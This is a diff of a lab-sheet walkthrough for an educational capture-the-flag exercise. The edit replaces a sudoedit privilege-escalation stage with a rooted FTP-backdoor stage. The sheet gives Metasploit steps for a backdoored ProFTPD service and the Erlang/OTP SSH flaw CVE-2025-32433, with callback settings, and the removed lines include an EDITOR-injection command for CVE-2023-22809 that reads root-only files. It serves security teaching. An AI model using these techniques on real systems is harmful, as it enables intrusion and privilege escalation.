@@ -2,8 +2,8 @@
 title: "Critical Failure: VM Technical Steps"
 author: ["Z. Cliffe Schreuders"]
 license: "CC BY-SA 4.0"
-description: "Technical companion to the Critical Failure walkthrough, for the OT jump server work: step-by-step hints for scanning the server, reaching its FTP and SSH services, escalating to root with sudo and submitting the four flags, plus command-line practice."
-tags: ["nmap", "service-enumeration", "ftp", "ssh", "erlang", "privilege-escalation", "sudo", "scada", "break-escape"]
+description: "Technical companion to the Critical Failure walkthrough, for the OT jump server work: step-by-step hints for scanning the server, taking a root shell through its backdoored FTP service, getting an SSH foothold, reading the crew's documents and submitting the four flags, plus command-line practice."
+tags: ["nmap", "service-enumeration", "ftp", "ssh", "erlang", "root-shell", "scada", "break-escape"]
 categories: ["safetynet"]
 redirect_from:
   - /labs/introducing_attacks/m04-critical-failure-vm-technical-steps/
@@ -35,7 +35,7 @@ cybok:
 
 ## Concepts: the Server Work
 
-Three ideas carry the server work: finding what a host runs, what it means for a service to need no login, and how sudo decides who may run what.
+Three ideas carry the server work: finding what a host runs, what it means for a service to need no login, and what it means for a service to run as root.
 
 ### Port scanning and service versions {#concept-scan}
 
@@ -68,24 +68,19 @@ When a service is affected, its version number tells you whether the flaw is pre
 
 > Question: If a daemon handles a message before it checks the caller, what does a version number tell you that a password prompt cannot?
 
-### Sudo, and the sudoedit flaw {#concept-sudo}
+### A service that already runs as root {#concept-root-service}
 
-`sudo` lets an account run specific commands as another user, usually root. Its rules live in `/etc/sudoers`, and `sudo -l` lists the rules that apply to your account.
+Every network service runs as some user account. When a service runs as **root** — the system administrator — any flaw that gives you a shell through it gives you a *root* shell straight away. There is no further step to climb: you are already the most privileged user on the box, and every file is yours to read, including files no ordinary account could open.
 
-```text
-User svcacct may run the following commands:
-    (root) NOPASSWD: /usr/bin/sudoedit <some file>
-```
+That is the case on this jump server. The backdoored file-transfer service runs as root, so the moment you trigger its backdoor you hold a root shell. Root's own home folder, `/root`, is readable only by root, and the crew left two documents there. Both are yours from that one shell: you do not need to escalate, because the service handed you root to begin with.
 
-`sudoedit` opens a file for editing as another user. The editor it uses comes from an environment setting. In an affected build of sudo (CVE-2023-22809), that setting could carry extra arguments, so the editor opened a file the rule never named. A rule that looks like "edit this one file" then becomes "edit any file", and a root-only file can be opened through the editor.
+The lesson for a defender is the mirror image: a service exposed to the network should run as the least-privileged account that can do its job, so that a flaw in it costs a foothold, not the whole machine.
 
-The fix is a newer sudo version, and checking the version is the first step in any sudo review.
-
-> Question: The output of `sudo -l` shows the rules. What can it not tell you about how a permitted program behaves, and how would you find out?
+> Question: A service you have just exploited runs as root. Why does that remove the need for a separate privilege-escalation step, and what does it let you read that an ordinary user's shell could not?
 
 ## Stuck? Hints: the Server Work
 
-These six stages follow the server work in order: getting onto the attack box, mapping the jump server, the FTP and SSH footholds, root, and the drop-site. Read each hint and try it first. Open the Nudge if you need the method, and the Recipe last.
+These five stages follow the server work in order: getting onto the attack box, mapping the jump server, the FTP drop (whose backdoor already gives a root shell, and with it both root-only documents), the SSH foothold, and the drop-site. Read each hint and try it first. Open the Nudge if you need the method, and the Recipe last.
 
 ### Stage 1: Getting onto the Kali Box {#hints-vm-connect}
 
@@ -147,16 +142,21 @@ nmap -sV -p <open-ports> <jump-server-address>
 
 > Warning: A scan of only the common ports misses the high port. Most students who think the box has one service have not run the full scan.
 
-### Stage 3: The FTP Drop {#hints-vm-ftp}
+### Stage 3: The FTP Drop — a Root Shell {#hints-vm-ftp}
 
-**Where:** the Kali shell and Metasploit. **Goal:** get into the FTP service and read OptiGrid's transfer notes.
+**Where:** the Kali shell and Metasploit. **Goal:** take a root shell through the FTP service and read **both** documents the crew left in root's home.
 
-> Hint: The FTP service's version is the clue. Check it against the backdoored build you met at St Catherine's.
+> Hint: The FTP service's version is the clue. Check it against the backdoored build you met at St Catherine's. The shell it hands you is root, so read everything under `/root`.
 
 <details markdown="1">
 <summary>Nudge</summary>
 
-The FTP server runs a build with a backdoor, the same one you met earlier in the campaign. Metasploit has a module for it. The shell it gives you is root. Look in root's home folder, `/root`, for the `optigrid_transfer` folder and read the file `coordination_notes`. It is a real document, the cross-cell coordination intel: it says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. Read it for the plan, then take the flag printed at the end of the file. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
+The FTP server runs a build with a backdoor, the same one you met earlier in the campaign. Metasploit has a module for it, and the shell it gives you is **root** — so you own the box from this one step, with no escalation to climb. Root's home folder, `/root`, holds two documents, and both are yours from this shell:
+
+- `optigrid_transfer/coordination_notes` — the cross-cell coordination intel. It says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. The flag at its end is **flag 2** (the FTP-drop flag).
+- `root_only/bms_calibration_override` — the real payload: the calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. The flag at its end is **flag 3** (the root-only override flag).
+
+List all of `/root`, read both documents, and take both flags. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.
 
 **Learn it:** ==action: Before you run the exploit, check the module's options==. A wrong port or a wrong callback address fails silently.
 
@@ -181,18 +181,27 @@ set LHOST <kali-address>
 set LPORT <callback-port>
 ```
 
-4. \==action: Run `exploit`==, then open the transfer folder in root's home and read the notes with `ls` and `cat`. The shell may not start in `/root`, so use the full path:
+4. \==action: Run `exploit`==, then confirm you are root and list all of root's home. The shell may not start in `/root`, so use full paths:
 
 ```bash
-ls /root
-cat /root/optigrid_transfer/coordination_notes
+id
+ls -R /root
 ```
 
-\==action: Read the coordination notes== as a document, then copy the flag printed at the end of the file.
+5. \==action: Read both documents and copy the flag at the end of each==:
+
+```bash
+cat /root/optigrid_transfer/coordination_notes
+cat /root/root_only/bms_calibration_override
+```
+
+The first file carries **flag 2**; the second, the root-only override, carries **flag 3**. One root shell gives you both.
 
 </details>
 
 > Warning: If Metasploit says no session was created, check that the callback port is free on Kali and that the jump server can reach `LHOST`.
+
+> Note: Both flag 2 and flag 3 come from this one root shell. Flag 3 is the root-only calibration override — the smoking gun. There is no separate privilege-escalation step in this mission; the backdoored service runs as root, so reading the root-only file is just `cat`.
 
 ### Stage 4: The Erlang/OTP SSH Foothold {#hints-vm-erlang}
 
@@ -234,12 +243,11 @@ set LPORT <callback-port>
 exploit
 ```
 
-4. \==action: Confirm who you are on the box==, and what this account may run:
+4. \==action: Confirm who you are on the box==. This account is the daemon's service account, not root:
 
 ```bash
 id
 hostname
-sudo -l
 ```
 
 5. \==action: Read the operator notes== in the toolkit folder in the account's home, then copy the flag printed at the end:
@@ -248,52 +256,15 @@ sudo -l
 cat ~/optigrid_toolkit/operator_notes
 ```
 
+This carries **flag 4** (the SSH-foothold flag).
+
 </details>
 
 > Warning: A session that opens and drops at once usually means the callback is unstable. Retry, or pick a simpler payload. The Erlang SSH channel is narrow.
 
-### Stage 5: Root with sudoedit {#hints-vm-sudo}
+> Note: This foothold is the daemon's service account, not root — it proves the crew's own way back in (flag 4). Root, and the root-only override, you already have from the FTP backdoor in stage 3. There is no separate escalation step: the mission does not need one.
 
-**Where:** the foothold shell from stage 4. **Goal:** read the root-only calibration-override document and find the flag in it.
-
-> Hint: Your account is not root, and the file you want is root-only. Find out exactly what your account may run under sudo before you try anything clever.
-
-<details markdown="1">
-<summary>Nudge</summary>
-
-Run `sudo -l` on the foothold. One of the permitted commands is `sudoedit`. Check the sudo version, because the flaw is in an older build. If the version is in the affected range, the rule that looks like "edit one file" can be turned into "open another file", and the editor then shows you the root-only file `/root/root_only/bms_calibration_override`. That file is a document: the BMS calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. Read it as the real payload of the attack, then take the flag printed at the end. The sudo field guide, offered on your phone after the FTP or Erlang flag, covers the rule listing.
-
-**Learn it:** ==action: Look up the affected version range in the CVE advisory== before you try the technique. Confirming the version first tells you whether the attempt can work.
-
-</details>
-
-<details markdown="1">
-<summary>Recipe</summary>
-
-1. \==action: Confirm what you may run== with `sudo -l`, and note the `sudoedit` line.
-2. \==action: Check the sudo version==:
-
-```bash
-sudo -V | head -1
-```
-
-The advisory for CVE-2023-22809 lists sudo from 1.8.0 up to and including 1.9.12p1 as affected.
-
-3. \==action: Open the root-only file through the editor==, pointing `EDITOR` at the full root-only path (`/root/root_only/bms_calibration_override`) and running `sudoedit` on the file the rule permits. Use the full path: your shell is not in root's home. The editor must accept extra arguments, as vim does:
-
-```bash
-EDITOR='vim -- /root/root_only/bms_calibration_override' sudoedit <file-you-may-edit>
-```
-
-4. \==action: Read the calibration-override document== in the editor and copy the flag at the end, then quit without saving. In vim, that is `:q!`.
-
-</details>
-
-> Note: If you listed root's home from the FTP stage's root shell, you may already have seen this file. This stage teaches the other way the crew reached root: from the foothold account, through sudo.
-
-> Warning: Quit without saving. If you write changes to a root-owned file, you have changed the box, and the next student's run will not match your notes.
-
-### Stage 6: Submitting the Four Flags {#hints-vm-dropsite}
+### Stage 5: Submitting the Four Flags {#hints-vm-dropsite}
 
 **Where:** the SAFETYNET Drop-Site Terminal in the workshop. **Goal:** submit each flag you earned.
 
@@ -326,8 +297,8 @@ Each flag you read on the server is for one step, and the step's task on the obj
 | A port does not answer | The service is on another port, or it stopped. Rescan that port. |
 | Metasploit says no session was created | The callback cannot reach Kali. Check `LHOST` and the callback port. |
 | The module runs and nothing happens | The version is not in the affected range, or you picked the wrong module. Run `info` on the module. |
-| `sudo -l` lists nothing you expected | You are on a different account than you think. Run `id` first. |
-| `sudoedit` runs and nothing opens | The editor setting did not take. Check the sudo version, and that the editor exists on the box. |
+| `cat /root/...` says "Permission denied" | You are not root. The FTP backdoor's shell is root; the Erlang foothold's is not. Read root's files from the FTP shell. |
+| `/root` looks empty or a file is missing | You are reading from the foothold account, which cannot see into `/root`. Use the root shell from stage 3. |
 
 ## Try It on the Command Line (Optional)
 
@@ -344,16 +315,16 @@ ss -tlnp
 
 > Question: Did `nmap` and `ss` agree on every port? If not, which one would you trust for a service you cannot log in to, and why?
 
-### Reading your own sudo rules {#cli-sudo}
+### Which user runs a service {#cli-service-user}
 
-On a machine you own, ==action: check the sudo version and the rules that apply to your account==:
+On a machine you own, ==action: see which account each listening service runs as==:
 
 ```bash
-sudo -V | head -1
-sudo -l
+ss -tlnp
+ps -o user= -p <pid-from-ss>
 ```
 
-> Question: The version is in an affected range, but `sudo -l` does not mention `sudoedit`. Does that mean you are safe from CVE-2023-22809? What would you check next?
+> Question: If a service in that list runs as root, what does a code-execution flaw in it hand an attacker, and how is that different from the same flaw in a service running as an unprivileged account?
 
 ## After the Game: Attacking the Server
 
@@ -361,17 +332,15 @@ sudo -l
 
 > Question: The Erlang flaw needs no login. Which controls would have stopped it, and which would have made no difference?
 
-> Question: Sudo gave the foothold account a permitted command. Why is "it only edits one file" a weaker guarantee than it sounds?
+> Question: The file-transfer service ran as root, so exploiting it gave a root shell outright, and with it the root-only override. What should the plant have changed so that a flaw in that service cost a foothold rather than the whole box?
 
-> Action: Write a short scan record for the jump server: host, open ports, services with versions, the priority you would give each, and the one check you would run first. Hand it in with the sudo version you checked on the foothold.
+> Action: Write a short scan record for the jump server: host, open ports, services with versions, the priority you would give each, and the one check you would run first. Note which service, if exploited, would hand over the most, and why.
 
 ## Further Reading
 
 - [SAFETYNET Field Guide: Erlang/OTP SSH RCE](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/erlang-otp-ssh-rce/)
-- [SAFETYNET Field Guide: Privilege Escalation via Sudo](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/privilege-escalation/)
 - [SAFETYNET Field Guide: ProFTPD Exploitation Workflow](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/proftpd-exploitation-workflow/)
 - [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433) (Erlang/OTP SSH)
-- [CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809) (sudoedit)
 
 
 
